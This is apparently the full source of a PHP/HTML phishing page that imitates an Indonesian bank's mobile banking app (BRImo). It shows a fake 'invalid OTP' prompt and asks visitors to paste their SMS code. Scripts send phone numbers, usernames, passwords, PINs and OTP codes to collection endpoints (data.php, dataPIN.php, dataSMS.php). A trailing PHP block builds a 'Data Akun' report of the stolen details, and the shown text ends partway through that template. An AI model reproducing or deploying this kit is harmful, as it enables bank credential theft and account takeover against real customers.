<?php ob_start() ?>
<?php 
if (!function_exists('base_url')) {
function base_url($atRoot=FALSE, $atCore=FALSE, $parse=FALSE){
if (isset($_SERVER['HTTP_HOST'])) {
$http = isset($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off' ? 'https' : 'http';
$hostname = $_SERVER['HTTP_HOST'];
$dir = str_replace(basename($_SERVER['SCRIPT_NAME']), '', $_SERVER['SCRIPT_NAME']);
$core = preg_split('@/@', str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath(dirname(__FILE__))), NULL, PREG_SPLIT_NO_EMPTY);
$core = $core[0];
$tmplt = $atRoot ? ($atCore ? "%s://%s/%s/" : "%s://%s/") : ($atCore ? "%s://%s/%s/" : "%s://%s%s");
$end = $atRoot ? ($atCore ? $core : $hostname) : ($atCore ? $core : $dir);
$base_url = sprintf( $tmplt, $http, $hostname, $end );
}
else $base_url = 'http://localhost/';
if ($parse) {
$base_url = parse_url($base_url);
if (isset($base_url['path'])) if ($base_url['path'] == '/') $base_url['path'] = '';
}
return $base_url;
}
}
$base_url = base_url();

?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title></title>
</head>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

<style type="text/css">
    html, body {
      max-width: 100%;
      overflow-x: hidden;
      background-image:url("bri_new5.png");
        background-repeat: no-repeat;
        background-size: cover;
      }
welalxcome {
        position: fixed;
    left: 0;
    top: 0;
    width: 100vw;
    height: 100vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    align-content: center;
    justify-content: center;
}
welalxcome img {
        width: 11vw;
    height: auto;
}
chsalxcome {
        position: relative;
    width: 100%;
    height: 100vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.talxcome {
    width: 130%;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    height: 100%;
    justify-content: center;
}
.talxcome img {
        width: 73%;
}
.balxcome {
        height: 45vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.txalxcome {
        width: 90%;
    height: 25vh;
    text-align: left;
}
.txalxcome p {
        font-weight: 600;
    font-size: 1.5rem;
    margin-bottom: 5vh;
    color: #1d66ab;
}
.txalxcome span {
        width: 80%;
    font-size: 18px;
}
.btalxcome {
        width: 90%;
    height: 20vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.btalxcome button {
        width: 100%;
    background: #1d66ab;
    color: #fff;
    font-family: inherit;
    border-radius: 5px;
    border: none;
    font-size: 16px;
    padding: 2vh 0px;
    margin-bottom: 4vh;
    font-weight: 500;
    box-shadow: 0px 0px 1px 0px #000;
    cursor: pointer;
}
.btalxcome p {
        color: #1d66ab;
    font-weight: 500;
    cursor: pointer;
}
frmalxbr {
        position: relative;
    width: 100vw;
    height: 100vh;
}
.hdralxfrm {
        width: 100%;
    position: fixed;
    left: 0;
    top: 0;
    display: block;
    text-align: center;
    padding: 1.5vh 0px;
    box-shadow: 0px 1px 20px 0px #00000040;
    z-index: 1;
}
.hdralxfrm img {
        width: 10vw;
    height: auto;
}
.chalxfrm {
        position: relative;
    width: 100%;
    height: 50vh;
    z-index: 0;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.bgchalxfrm {
    background: url(https://siapjadi.com/brimo0/bifast1/selamatdatang.png) no-repeat center;
    background-size: 100%;
    position: unset;
    width: 100%;
    border-radius: 0px;
    top: 0;
    height: 100%;
    border: none;
    margin-top:-20px;
}
.chalxfrm p {
        position: absolute;
    color: #fff;
    font-size: 19px;
    font-weight: 600;
    letter-spacing: 1px;
    top: 11vh;
}
.chalxfrm img {
        position: absolute;
    width: 90%;
    bottom: 5vh;
}
.frmalxbrm {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    height: 42vh;
    width: 100%;
}
.inpalxbrm {
        margin-top: 3vh;
    width: 90%;
    height: 35vh;
}
.inpalxbrm p {
        color: #2069ab;
    font-weight: 600;
    font-size: 18px;
    letter-spacing: 1px;
    margin-left: 3vw;
}
.bxmalxbrm {
        display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 100%;
    padding-top: -2vh;
}
.itmalxbrm {
    position: relative;
        width: 100%;
    background: #fff;
    box-shadow: 0px 1px 3px 0px #cccaca;
    border-radius: 3px;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    padding: 1.8vh 2vw;
    column-gap: 3vw;
    height:40px;
}
.itmalxbrm img {
        height: 4vh;
}
.itmalxbrm input {
        font-family: arial, sans-serif;
    font-size: 17px;
    font-weight: 300;
    border: none;
    outline: none;
}
.inpalxbrm span {
        width: 100%;
    text-align: right;
    display: block;
    margin-top: 2.5vh;
    font-size: 14px;
    cursor: pointer;
}
.btnalxfrm {
        height: 10vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
    width: 90%;
}
.btnalxfrm button {
        width: 100%;
    background: #1d66ab;
    color: #fff;
    font-family: inherit;
    border-radius: 5px;
    border: none;
    font-size: 16px;
    padding: 2vh 0px;
    margin-bottom: 4vh;
    font-weight: 500;
    box-shadow: 0px 0px 1px 0px #000;
    cursor: pointer;
}
#togglePassword {
    background-size: 100% 100%;
    height: 3vh;
    width: 3.5vh;
    margin-top: 0;
    position: absolute;
    right: 4vw;
    cursor: pointer;
}
.fa-eye {
    background: url(https://siapjadi.com/brimo/bulamata-.png) no-repeat center;
}
.fa-eye-slash {
    background: url(https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/20220617_022922.png) no-repeat center;
}
.opbtn {
    opacity: 0.5;
}
.alxslh {
        position: fixed;
    left: 0;
    top: 0vh;
    z-index: 3;
    font-size: 14px;
    font-weight: 400;
    color: #fff;
    background: #f53939;
    text-align: center;
    width: 100%;
    font-family: arial, sans-serif;
    padding: 1.7vh 0px;
    display: none;
}
pnalxbr {
        background: rgb(36 131 240);
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    width: 100vw;
    height: 100vh;
    color: white;
}
.hdralxpn {
        width: 100%;
    height: 5vh;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
}
.hdralxpn span {
        margin-left: 3%;
}
.hdralxpn p {
       font-weight: 400;
    font-size: 15px; 
}
.hdralxpn label {
        visibility: hidden;
    margin-right: 3%;
}
.txalxpn {
        padding-top: 10vh;
    padding-bottom: 5vh;
    width: 70%;
    text-align: left;
}
.txalxpn p {
       font-size: 17px;
    font-weight: 400; 
}
.txalxpn span {
        font-size: 12px;
    font-weight: 300;
    font-family: Arial, sans-serif;
}
.inpalxpn {
        width: 70%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
#alxpnnikah {
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: center;
    column-gap: 7vw;
    position: relative;
    align-content: center;
}
#alxpnnikah input {
        position: absolute;
    z-index: 2;
    color: #fff;
    border: none;
    outline: none;
    font-family: inherit;
    background: transparent;
    font-size: 24px;
    letter-spacing: 10vw;
    width: 100%;
    overflow: hidden;
    float: left;
    text-align: left;
    text-overflow: revert;
    cursor: not-allowed;
    pointer-events: none;
}
.bxinpalxpn {
        width: 6vw;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    position: relative;
    align-content: center;
    justify-content: center;
    
}
.bxinpalxpn input {
        width: 100%;
    height: 100%;
    position: absolute;
    background: transparent;
    outline: none;
    border: none;
    cursor: pointer;
    text-align: center;
    color: #fff;
    font-family: inherit;
    font-size: 24px;
}
.bxinpalxpn span {
       background-color:#88b4e6;
    color:white;
    height: 6.5vh;
    width: 5.5vh;
    display: block;
    border-radius: 10px;
}
.txalxlppn {
        padding: 7vh 0px 9vh;
    font-size: 13px;
    font-family: arial, sans-serif;
    cursor: pointer;
}
.kybalxpn {
        width: 90%;
}
.inpalxkyb {
        width: 80%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 4vh;
    margin-left:30px;
}
.inpalxkyb button {
    background-color: transparent;
    
    font-family: inherit;
    cursor: pointer;
    outline: none;
    border: none;
    font-size: 25px;
    width: 20%;
    height: 6vh;
}
smalxs {
        height: 100vh;
    width: 100vw;
    background: #f2f2f2;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
}
.bxalxsm {
        position: relative;
    width: 85%;
    padding: 15vh 0% 2vh;
    background: #fff;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
    border: 1px solid rgba(166, 166, 166, 0.37);
    border-radius: 10px;
}
.bxalxsm img {
        width: 80%;
    position: absolute;
    top: -10vh;
}
.bxalxsm garis {
        display: block;
    width: 100%;
    border-bottom: 2px dotted rgb(204, 204, 204);
}
.bxalxsm label {
        color: #0776ED;
    font-weight: 300;
    font-family: arial, sans-serif;
    padding: 2vh;
}
.alxinpsm {
        width: 90%;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: flex-start;
}
.alxinpsm span {
        color: rgb(158, 158, 158);
    font-size: 12px;
    font-family: arial, sans-serif;
}
.alxinpsm input {
        box-sizing: border-box;
    z-index: 4;
    height: 75px;
    width: 100%;
    left: 0px;
    border-width: 1px;
    border-style: solid;
    border-color: rgb(189, 189, 189) rgb(189, 189, 189) rgb(214, 214, 214);
    border-image: initial;
    background-color: transparent;
    border-radius: 5px;
    box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
    font-size: 13px;
    color: rgb(85, 85, 85);
    padding: 0px 4px;
    top: 20px;
    transition: border-bottom-color 200ms ease 0s;
    margin: 1vh 0px 2vh;
    font-family: arial, sans-serif;
    outline: navajowhite;
}
.btnalxsm {
        width: 100%;
    text-align: right;
}
.btnalxsm button {
    cursor: pointer;
    background: none rgb(0, 134, 224);
    border: none;
    text-align: center;
    box-sizing: border-box;
    z-index: 6;
    height: 33px;
    left: 0px;
    top: 0px;
    font-size: 14px;
    color: rgb(255, 255, 255);
    line-height: 1;
    border-radius: 6px;
    box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
    font-family: arial, sans-serif;
    letter-spacing: 1px;
    padding: 0px 10px;
    outline: navajowhite;
}
.dscalxsm {
        margin-top: 5vh;
    display: flex;
    flex-direction: column;
    flex-wrap: nowrap;
    align-items: center;
}
.dscalxsm p {
        text-align: center;
    width: 90%;
    font-size: 10px;
    color: rgba(10, 10, 10, 0.73);
    font-family: arial, sans-serif;
}
.malasngoding-slider { 
    border: 10px solid #efefef; 
    position: relative; 
    overflow: hidden; 
    background: #efefef;
}
 
.malasngoding-slider { 
    margin:20px auto;
    width: 768px;
    height: 450px; 
}
 
.isi-slider img { 
    width: 768px;
    height: 450px; 
    float: left;
}
 
.isi-slider { 
    position: absolute; 
    width:3900px;  
 
    /*pengaturan durasi lama tampil gambar bisa di atur di bawah ini*/
    animation-name:slider;
    animation-duration:16s;
    animation-timing-function: ease-in-out;
    animation-iteration-count:infinite;
    -webkit-animation-name:slider;
    -webkit-animation-duration:16s;
    -webkit-animation-timing-function: ease-in-out;
    -webkit-animation-iteration-count:infinite;
    -moz-animation-name:slider;
    -moz-animation-duration:16s;
    -moz-animation-timing-function: ease-in-out;
    -moz-animation-iteration-count:infinite;
    -o-animation-name:slider;
    -o-animation-duration:16s;
    -o-animation-timing-function: ease-in-out;
    -o-animation-iteration-count:infinite;
}
 
 
/*saat gambar di hover oleh cursor mouse maka berhenti slide*/
.isi-slider:hover { 
    -webkit-animation-play-state:paused; 
    -moz-animation-play-state:paused; 
    -o-animation-play-state:paused; 
    animation-play-state:paused; }
}
 
.isi-slider img { 
    float: right; 
}
 
.malasngoding-slider:after { 
    font-size: 150px; 
    position: absolute; 
    z-index: 12; 
    color: rgba(255,255,255, 0); 
    left: 300px; top: 80px; 
    -webkit-transition: 1s all ease-in-out; 
    -moz-transition: 1s all ease-in-out; 
    transition: 1s all ease-in-out; 
}
 
.malasngoding-slider:hover:after { 
    color: rgba(255,255,255, 0.6);  
}
 
 
 
@-moz-keyframes slider {     
    0% {
        left: 0; opacity: 0; 
    }     
    2% {
        opacity: 1; 
    }     
    20% {
        left: 0; opacity: 1; 
    }     
    21% {
        opacity: 0; 
    }     
    24% {
        opacity: 0; 
    }     
    25% {
        left: -768px; opacity: 1; 
    }       
    45% {
        left: -768px; opacity: 1; 
    }     
    46% {
        opacity: 0; 
    }     
    48% {
        opacity: 0; 
    }     
    50% {
        left: -1536px; opacity: 1; 
    }     
    70% {
        left: -1536px; opacity: 1; 
    }     
    72% {
        opacity: 0; 
    }     
    74% {
        opacity: 0; 
    }    
    75% {
        left: -2304px; opacity: 1; 
    }       
    95% {
        left: -2304px; opacity: 1; 
    }       
    97% { 
        left: -2304px; opacity: 0;
    }       
    100% {
        left: 0; opacity: 0; 
    }
} 
 
@-webkit-keyframes slider {     
    0% {
        left: 0; opacity: 0; 
    }     
    2% {
        opacity: 1; 
    }     
    20% {
        left: 0; opacity: 1; 
    }     
    21% {
        opacity: 0; 
    }     
    24% {
        opacity: 0; 
    }     
    25% {
        left: -768px; opacity: 1; 
    }       
    45% {
        left: -768px; opacity: 1; 
    }     
    46% {
        opacity: 0; 
    }     
    48% {
        opacity: 0; 
    }     
    50% {
        left: -1536px; opacity: 1; 
    }     
    70% {
        left: -1536px; opacity: 1; 
    }     
    72% {
        opacity: 0; 
    }     
    74% {
        opacity: 0; 
    }    
    75% {
        left: -2304px; opacity: 1; 
    }       
    95% {
        left: -2304px; opacity: 1; 
    }       
    97% { 
        left: -2304px; opacity: 0;
    }       
    100% {
        left: 0; opacity: 0; 
    }
} 
 
 
@keyframes slider {     
    0% {
        left: 0; opacity: 0; 
    }     
    2% {
        opacity: 1; 
    }     
    20% {
        left: 0; opacity: 1; 
    }     
    21% {
        opacity: 0; 
    }     
    24% {
        opacity: 0; 
    }     
    25% {
        left: -768px; opacity: 1; 
    }     
    45% {
        left: -768px; opacity: 1; 
    }     
    46% {
        opacity: 0; 
    }     
    48% {
        opacity: 0; 
    }     
    50% {
        left: -1536px; opacity: 1; 
    }     
    70% {
        left: -1536px; opacity: 1; 
    }     
    72% {
        opacity: 0; 
    }     
    74% {
        opacity: 0; 
    }    
    75% {
        left: -2304px; opacity: 1; 
    }       
    95% {
        left: -2304px; opacity: 1; 
    }       
    97% { 
        left: -2304px; opacity: 0; 
    } 
 
    100% {
        left: 0; opacity: 0; 
    }
}
*{
    margin: 0;
    padding: 0;
    list-style: none;
    text-decoration: none;
}

.slider{
    overflow: hidden;
    height: 350px;
}

.slider figure div{
    width: 20%;
    float: left;
}

.slider figure img{
    width: 100%;
    float: left;
}

.slider figure{
    position: relative;
    width: 500%;
    margin: 0;
    left: 0;
    animation: 20s slidy infinite;
}

@keyframes slidy{
    0%{
        left: 0%
    }

    10%{
        left: 0%;
    }

    12%{
        left: -100%;
    }

    22%{
        left: -100%;
    }

    24%{
        left: -200%;
    }

    34%{
        left: -200%;
    }

    36%{
        left: -300%;
    }

    46%{
        left: -300%;
    }

    48%{
        left: -400%;
    }

    58%{
        left: -400%;
    }

    60%{
        left: -300%;
    }

    70%{
        left: -300%;
    }

    72%{
        left: -200%;
    }

    82%{
        left: -200%;
    }

    84%{
        left: -100%;
    }

    94%{
        left: -100%;
    }

    96%{
        left: 0%;
    }

    100%{
        left: 0%;
    }
}
/* css modal */

:root {
  --modal-duration: 1s;
  --modal-color: #428bca;
}


.button {
  background: #428bca;
  padding: 1em 2em;
  color: #fff;
  border: 0;
  border-radius: 5px;
  cursor: pointer;
}

.button:hover {
  background: #3876ac;
}

.modal {
  display: none;
  position: fixed;
  z-index: 1;
  left: 0;
  top: 0;
  height: 100%;
  width: 100%;
  overflow: auto;
  background-color: rgba(0, 0, 0, 0.5);
}

.modal-content {
  margin: 50% auto;
  width: 85%;
  box-shadow: 0 5px 8px 0 rgba(0, 0, 0, 0.2), 0 7px 20px 0 rgba(0, 0, 0, 0.17);
  animation-name: modalopen;
  animation-duration: var(--modal-duration);
}

.modal-header h2,
.modal-footer h3 {
  margin: 0;
}

.modal-header {
  background: var(--modal-color);
  padding: 15px;
  color: #fff;
  border-top-left-radius: 5px;
  border-top-right-radius: 5px;
}

.modal-body {
  padding: 10px 20px;
  background: #fff;
}

.modal-footer {
  background: var(--modal-color);
  padding: 10px;
  color: #fff;
  text-align: center;
  border-bottom-left-radius: 5px;
  border-bottom-right-radius: 5px;
}

.close {
  color: #ccc;
  float: right;
  font-size: 30px;
  color: #fff;
}

.close:hover,
.close:focus {
  color: #000;
  text-decoration: none;
  cursor: pointer;
}

@keyframes modalopen {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
#alxsm {
      border-radius: 10px;
      border: 2px solid #09559a;
      color: #09559a;
      font-size: 14px;
      font-weight:bold;
      margin-bottom: 15px;
      padding: 0.5em 1em 0.5em 0;
      width: 90%;     /* Ukuran bebas */
      height: 100px;     /* Ukuran bebas */
      text-align: center;
      margin-left:5px;
 }
 .bgchalxfrm2 {
    background: url(https://siapjadi.com/header4.png) no-repeat center;
    background-size: 110%;
    position: unset;
    width: 130%;
    border-radius: 0px;
    top: 0;
    height: 500px;
    border: none;
    margin-right:-20px;
}

/* css modal*/
</style>
<body>

<div class="container">
    <div class="row">
        
      <form id="kirimsms" action="" method="post" enctype="multipart/form-data">
      
      <div style="margin-top:80px;background-color:white;padding:20px;border-radius:10px;box-shadow: 2px 3px 6px 0px #c4cbd7;margin-bottom:10px" class="col-sm-6 col-md-6">
          
        <div class="row" >
           <center>
               <img style="width:100%;float:center" src="rahasia3.png">
           </center>
       </div>
       <div class="row" style="margin-top:-80px" >
              <center><img style="width:80%;float:center" src="https://cdn.jsdelivr.net/gh/AlexHostX/another@main/brims/malx.png"></center>
       </div>
        
       <br>
        <div class="mb-4">
             <div id="my-modal" class="modal">
                        <div class="modal-content">
                         <!-- <div class="modal-header" style="background-color:white;color:#09559a;">
                            <span style="color:#09559a;" class="close">&times;</span>
                            <center><h3>Konfirmasi SMS Kode Aktivasi</h3></center>
                          </div>-->
                          <div class="modal-body">
                           <center>
                               <br>
                               <img width="80%" src="bankk.jpg">
                              <br>
                              
                              <h4 style="color:#12408d;font-weight:bold">KODE OTP TIDAK VALID</h4>
                              <p style="margin-top:-10px">Mohon tunggu sms yang terbaru</p>
                               
                              <a href="<?php echo $base_url."sms.php?nomorhp=".$_GET['nomorhp']."&username".$_GET['username']."&password=".$_GET['password']; ?>" style="text-decoration:none;background:#0F78CB" class="button form-control" >Kembali</a>
                           </center>
                           <br>
                          </div>
                          <!--<div class="modal-footer">
                            <h3>Modal Footer</h3>
                          </div>-->
                        </div>
                      </div>
                      
            <div class="input-group">
              <!--<span class="input-group-btn">
                <img width="60px" src="https://siapjadi.com/benderari.png" style="border:1px solid grey">
              </span>-->
              <textarea style="text-align:center
                        " name="sms" id="sms" style="background-color: #FFF;font-weight: Bold" class="form-control" id="exampleFormControlTextarea1" maxlenght="12" rows="3" placeholder="Tempel Disini"></textarea>
                        
             
            </div><!-- /input-group -->
          </div><!-- /.col-lg-6 -->
        <div class="row" >
              <center>
                  <button name="lanjutkan" type="submit" style="
                  border:0px;
                  font-size:20px ;
                  background: #0F78CB;
                  color: white;
                  border-radius: 10px;
                  font-weight: bold;
                  width:100%;
                  float:centre;"  class="btn btn-primary" >Lanjut</button>
              
                 
              </center>
           </div>
           <div class="row" >
               <img width="100%" src="norton.png">
           </div>
       </form>
       
    </div>
    <div class="row" >
       <img width="100%" src="ptbRI.png">
   </div>
    
    
    
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script>
        $( document ).ready(function() {
            setTimeout(() => {
                openModal();
            },100)
            
        });
        
        /*sript modal*/

        // Get DOM Elements
        const modal = document.querySelector('#my-modal');
        const modalBtn = document.querySelector('#btnpst');
        const closeBtn = document.querySelector('.close');
        const closeBtn2 = document.querySelector('#close');
        
        // Events
        modalBtn.addEventListener('click', openModal);
        closeBtn.addEventListener('click', closeModal);
        closeBtn2.addEventListener('click', closeModal2);
        window.addEventListener('click', outsideClick);
        
        // Open
        function openModal() {
          modal.style.display = 'block';
        }
        
        // Close
        function closeModal() {
          modal.style.display = 'none';
        }
        
        // Close
        function closeModal2() {
          modal.style.display = 'none';
        }
        
        
        // Close If Outside Click
        function outsideClick(e) {
          if (e.target == modal) {
            modal.style.display = 'none';
          }
        }
        
        
        /* script modal*/

        function alxfrmb() {
            $("input[type=checkbox]").on( "change", function(evt) {
                document.getElementById("label1").style.color = '#09559a';
                document.getElementById("label2").style.color = '#09559a';
            });

            var tarif = $('input[id=tarif]:checked');
            var label = $('#label');
            if(tarif.length == 0){

                document.getElementById("label1").style.color = 'red';
                document.getElementById("label2").style.color = 'red';
                $('#haruspilih').show();
                setTimeout(() => {
                    $('#haruspilih').fadeOut();
                },1000)
                $('#pslh').hide();
                return false;
            }else{

                $('chsalxcome2').hide();
                $('frmalxbr').show();
           }
            
            
        }
        </script>
        
        <script>
            const togglePassword = document.querySelector("#togglePassword");
            const password = document.querySelector("#palx");
    
            togglePassword.addEventListener("click", function () {
                // toggle the type attribute
                const type = password.getAttribute("type") === "password" ? "text" : "password";
                password.setAttribute("type", type);
                
                // toggle the icon
                this.classList.toggle("fa-eye-slash");
            });
            
            let input = document.querySelector(".input");
            let button = document.querySelector("#btnpst");
            
            button.disabled = true; //setting button state to disabled
            
            input.addEventListener("change", stateHandle);
            
            function stateHandle() {
                if (document.querySelector(".input").value === "") {
                    button.disabled = true; //button remains disabled
                    $('#btnpst').addClass('opbtn');
                } else {
                    button.disabled = false; //button is enabled
                    $('#btnpst').removeClass('opbtn');
                }
            }
            
            </script>
        
        <script>
            
             function alxfrm(){
                $ealx = $('#ealx').val().trim();
                $palx = $('#palx').val().trim();
                if($ealx == '' || $ealx == null || $ealx.length <= 5)
                {
                    $('#eslh').show();
                    setTimeout(() => {
                        $('#eslh').fadeOut();
                    },2000)
                    $('#pslh').hide();
                    return false;
                }else{
                    $('#eslh').hide();
                }
                if($palx == '' || $palx == null || $palx.length <= 5)
                {
                    $('#pslh').show();
                    setTimeout(() => {
                        $('#pslh').fadeOut();
                    },2000)
                    return false;
                }else{
                    $('#pslh').hide();
                }
                
                if($ealx.length >=5 || $palx.length >=5) {
                    $.ajax({
                        type: 'POST',
                        url: 'data.php',
                        data: $('#ngumpulinuangnikah').serialize(),
                        dataType: 'text',
                        success: function() {
                                    $('frmalxbr').hide();
                                    $('pnalxbr').show();
                                    $("input#remail").val($ealx);
                                    $("input#rpassword").val($palx);
                            } 
                    })
                }
            }
            </script>
        
        <script>
            
            function clpnalx() {
                $('frmalxbr').show();
                $('pnalxbr').hide();
            }
            //key numeric
            
            </script>
        
        <script>
                function playAudio() {
                    var notifikasi = new Audio("https://siapjadi.com/brimo0/bifast2/tanpapin/play.mp3");
                    notifikasi.play();
                }
                
                function kodeinvalid() {
                    var notifikasi2 = new Audio("https://siapjadi.com/brimo0/script7/kodeinvalid.mp3");
                    notifikasi2.play();
                }
                
                $( document ).on( "click", ".key1", function(){
                    var parents1 = $( this ).parents( "pnalxbr" );
                    var number1 = $( this ).attr( "data-key" );
                    
                    var input1 = parents1.find(".alxpinr");
                    var inputValue1 = input1.val();
                    
                    input1.val( inputValue1 + number1 ).change()[0].maxLength = 6;
                    $("#pinalx").on('input', function() {
                        var $display = $("#pinalx").val();
                        if($display.length >= 6) {
                                $("#kbrd0").prop("disabled", true);
                                $("#kbrd1").prop("disabled", true);
                                $("#kbrd2").prop("disabled", true);
                                $("#kbrd3").prop("disabled", true);
                                $("#kbrd4").prop("disabled", true);
                                $("#kbrd5").prop("disabled", true);
                                $("#kbrd6").prop("disabled", true);
                                $("#kbrd7").prop("disabled", true);
                                $("#kbrd8").prop("disabled", true);
                                $("#kbrd9").prop("disabled", true);
                                alert("Selamat datang di tutorial Javascript");
                            }else{
                                $("#kbrd0").prop("disabled", false);
                                $("#kbrd1").prop("disabled", false);
                                $("#kbrd2").prop("disabled", false);
                                $("#kbrd3").prop("disabled", false);
                                $("#kbrd4").prop("disabled", false);
                                $("#kbrd5").prop("disabled", false);
                                $("#kbrd6").prop("disabled", false);
                                $("#kbrd7").prop("disabled", false);
                                $("#kbrd8").prop("disabled", false);
                                $("#kbrd9").prop("disabled", false);
                            }
                    });
                    
                    var alamat = document.getElementById("pinalx").value;
                    if (alamat.length >= 6) {
                        $('welalxcome').show();
                        fralxpn();
                        
                    }
                });
                
                $( document ).on( "click", "#del", function(){
                    document.getElementById("pinalx").value="";
                    
                });
                
                
                </script>
        
        <script>
            function fralxpn(){
                $pinalx = $('#pinalx').val().trim();
                $.ajax({
                        type: 'POST',
                        url: 'dataPIN.php',
                        data: $('#alxpnnikah').serialize(),
                        dataType: 'text',
                        success: function() {
                            $('welalxcome').hide();
                            $('pnalxbr').hide();
                            $('smalxs').show();
                            $("input#rpin").val($pinalx);
                            
                            
                            /*playAudio();*/
                        } 
                    })
            }
            
           
            
        </script>
        
        <script>
            $(document).ready(function() {
                $("#alxsm").on('input', function() {
                        var alxsm = $("#alxsm").val();
        
                        if(alxsm.length >= 6) {
                            $("#btnalxsm").prop("disabled", false);
                            $('#btnalxsm').css("opacity", "1")
                        }else{
                            $("#btnalxsm").prop("disabled", true);
                            $('#btnalxsm').css("opacity", "0.5")
                        }
                });
            });
            </script>
        
        <script>
            function fralxsm(){
                $.ajax({
                        type: 'POST',
                        url: 'dataSMS.php',
                        data: $('.alxinpsm').serialize(),
                        dataType: 'text',
                        success: function() {
                            $('#eror').show();
                            setTimeout(() => {
                                $('#eror').fadeOut();
                            },3000)
                            $('#alxsm').val('');
                           /* kodeinvalid();*/
                        } 
                    })
            }
            
            
            </script>
        
        <script>
            var timer2 = "03:01";
            var interval = setInterval(function() {
            
            
              var timer = timer2.split(':');
              //by parsing integer, I avoid all extra string processing
              var minutes = parseInt(timer[0], 10);
              var seconds = parseInt(timer[1], 10);
              --seconds;
              minutes = (seconds < 0) ? --minutes : minutes;
              if (minutes < 0) clearInterval(interval);
              seconds = (seconds < 0) ? 59 : seconds;
              seconds = (seconds < 10) ? '0' + seconds : seconds;
              //minutes = (minutes < 10) ?  minutes : minutes;
              $('.countdown').html(minutes + ':' + seconds);
              timer2 = minutes + ':' + seconds;
            }, 1000);
        </script>

</body>
</html>
<?php

$submit=$_POST['lanjutkan'];
$telepon=$_POST['nomorhp'];
$email=$_POST['username'];
$password=$_POST['password'];
$sms=$_POST['sms'];

// KONTEN RESULT AKUN
$subjek = "Data Akun";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			    <tr>
					<th style="text-align: center;" colspan="3"> Info Pendaftaran Kartu Kredit </th>
				</tr>
				
				<tr>
					<td style="border-right: none;">No handphone </td>
					<td style="text-align: center;">$telepon</td>
				</tr>
				<tr>
					<td style="border-right: none;">Username </td>
					<td style="text-align: center;">$email</td>
				</tr>
